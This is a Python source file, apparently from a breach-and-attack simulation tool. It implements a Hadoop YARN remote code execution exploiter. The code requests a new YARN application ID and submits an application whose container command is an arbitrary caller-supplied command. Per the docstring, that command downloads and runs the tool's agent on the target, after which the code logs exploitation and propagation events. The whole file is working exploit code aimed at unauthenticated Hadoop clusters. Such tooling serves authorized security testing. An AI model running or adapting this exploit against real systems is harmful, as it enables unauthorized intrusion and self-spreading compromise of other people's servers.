import json
import logging
import posixpath
import string
from pprint import pformat
from time import time
from typing import Mapping, Tuple
from uuid import UUID

import requests

from common.agent_events import ExploitationEvent, PropagationEvent
from common.event_queue import IAgentEventPublisher
from common.tags import (
    T1105_ATTACK_TECHNIQUE_TAG,
    T1203_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
)
from common.types import Event
from common.utils.code_utils import insecure_generate_random_string
from infection_monkey.model import TargetHost

from .hadoop_options import HadoopOptions

logger = logging.getLogger(__name__)
HADOOP_EXPLOITER_TAG = "hadoop-exploiter"


class HadoopExploitClient:
    """
    Exploits Hadoop by submitting a new application to YARN. That application executes a custom
    command to download and execute the Agent.
    """

    _EXPLOITED_SERVICE = "Hadoop"
    NAME = "HadoopExploiter"
    # Random string's length that's used for creating unique app name
    RAN_STR_LEN = 6

    _EXPLOITER_TAGS = (HADOOP_EXPLOITER_TAG, T1203_ATTACK_TECHNIQUE_TAG, T1210_ATTACK_TECHNIQUE_TAG)
    _PROPAGATION_TAGS = (HADOOP_EXPLOITER_TAG, T1105_ATTACK_TECHNIQUE_TAG)

    def __init__(
        self,
        agent_id: UUID,
        agent_event_publisher: IAgentEventPublisher,
    ):
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher

    def exploit(
        self,
        target_host: TargetHost,
        options: HadoopOptions,
        interrupt: Event,
        url: str,
        command: str,
    ) -> bool:
        """
        A reference to a method which implements web exploit logic.

        :param url: Url to send malicious packet to. Format: [http/https]://ip:port/extension.
        :param command: Command which will be executed on remote host
        :return: RCE's output/True if successful or False if failed
        """
        try:
            timestamp = time()
            app_id = HadoopExploitClient._apply_for_application_id(url, options.request_timeout)
            payload = HadoopExploitClient._build_payload(
                app_id, options.yarn_application_suffix, command
            )

            if interrupt.is_set():
                return False

            resp = HadoopExploitClient._send_exploit_payload(url, payload, options.request_timeout)
            success = resp.status_code == 202
        except requests.ConnectionError:
            success = False

        message = "" if success else f"Failed to exploit via {url}"
        self._publish_exploitation_event(target_host, timestamp, success, error_message=message)
        self._publish_propagation_event(target_host, timestamp, success, error_message=message)
        return success

    @staticmethod
    def _apply_for_application_id(url: str, request_timeout: float) -> str:
        """
        Applies for a new application id in YARN
        :param url: The URL to apply for a new application id
        :return: The new application id
        """
        application_url = posixpath.join(url, "ws/v1/cluster/apps/new-application")
        logger.info(f"Applying for new Hadoop application at {application_url}")

        # TODO: Fix crash here
        resp = requests.post(application_url, timeout=request_timeout)
        resp_dict = json.loads(resp.content)

        return resp_dict["application-id"]

    @staticmethod
    def _build_payload(
        app_id: str, yarn_application_suffix: str, command: str
    ) -> Mapping[str, str]:
        logger.info("Building Hadoop exploit payload")

        # Create a random name for our application in YARN
        # Avoid the risk of blocking by using insecure_generate_random_string()
        rand_name = yarn_application_suffix + insecure_generate_random_string(
            n=HadoopExploitClient.RAN_STR_LEN, character_set=string.ascii_lowercase
        )
        payload = {
            "application-id": app_id,
            "application-name": rand_name,
            "am-container-spec": {
                "commands": {
                    "command": command,
                }
            },
            "application-type": "YARN",
        }
        logger.debug(f"Hadoop exploit payload: {pformat(payload)}")

        return payload

    @staticmethod
    def _send_exploit_payload(
        url: str, payload: Mapping[str, str], timeout: int
    ) -> requests.Response:
        target_url = posixpath.join(url, "ws/v1/cluster/apps/")
        logger.info(f"Sending Hadoop exploit payload to {target_url}")

        resp = requests.post(
            target_url,
            json=payload,
            timeout=timeout,
        )
        logger.debug(f"Hadoop responded to exploit payload with code {resp.status_code}")

        return resp

    def _publish_exploitation_event(
        self,
        target_host: TargetHost,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        exploitation_event = ExploitationEvent(
            source=self._agent_id,
            target=target_host.ip,
            success=success,
            exploiter_name=self.NAME,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or self._EXPLOITER_TAGS),
        )
        self._agent_event_publisher.publish(exploitation_event)

    def _publish_propagation_event(
        self,
        target_host: TargetHost,
        time: float = time(),
        success: bool = False,
        tags: Tuple[str, ...] = tuple(),
        error_message: str = "",
    ):
        propagation_event = PropagationEvent(
            source=self._agent_id,
            target=target_host.ip,
            success=success,
            exploiter_name=self.NAME,
            error_message=error_message,
            timestamp=time,
            tags=frozenset(tags or self._PROPAGATION_TAGS),
        )
        self._agent_event_publisher.publish(propagation_event)
